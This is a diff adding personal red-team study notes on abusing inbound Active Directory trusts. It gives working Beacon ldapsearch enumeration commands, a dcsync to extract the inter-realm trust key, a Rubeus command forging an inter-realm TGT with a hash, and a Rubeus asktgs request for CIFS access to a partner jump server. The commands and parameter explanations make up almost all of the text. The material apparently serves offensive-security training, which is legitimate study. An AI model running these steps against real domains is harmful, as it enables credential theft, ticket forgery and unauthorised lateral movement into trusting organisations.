@@ -68,3 +68,37 @@ parent/child trust
                 /ticketuserid is the RID of the impersonated user
                 /sids is a list of SIDs we want to include in SID history
                 /krbkey is the aes256 hash of child domain's krbtgt account
+
+inbound trusts
+    if an adversary has access to a trusted domain, then they can access resources on the trusting domain
+    we need to find and impersonate principals in the trusted domain that have been configured with legit access in the trusting domain
+    enumerate the foreign security principals container which represent principals trusted by the trusting domain
+        beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
+            NOTE: this always contains 4 default values (S-1-5-4, S-1-5-9, S-1-5-11, and S-1-5-17)
+                  any other values are of interest! 
+    if there are additional SIDs, we should query LDAP to find out what
+        beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
+    say this shows us this domain group is a member of a domain group in partner.com as well, Partner Jump Users
+    now lets enumerate machines in partner.com
+        beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com
+    here, we can impersonate using credentials for an eligible principal then request access to the service
+    but say we don't have creds, we can forge inter-realm referral tickets
+        beacon> dcsync contoso.com CONTOSO\PARTNER$
+            NOTE: we are hunting for the inter-realm key (NTLM)
+        now we can use rubeus offline to forge a TGT
+            PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
+                where...
+                    /user is the user to impersonate
+                    /domain is the fqdn of the trusted domain
+                    /sid is the SID of the trusted domain
+                    /id is the RID of the impersonated user
+                    /groups are the RIDs of impersonated user's domain groups (Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102)
+                    /service is the krbtgt service of the trusting domain
+                    /rc4 is the NTLM inter-realm key value
+        now we request service tickets from the trusting domain 
+            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TGT] /nowrap
+                where...
+                    /service is the target service in the trusting domain
+                    /dc is the domain controller in the trusting domain
+                    /ticket is the inter-realm TGT
+                    
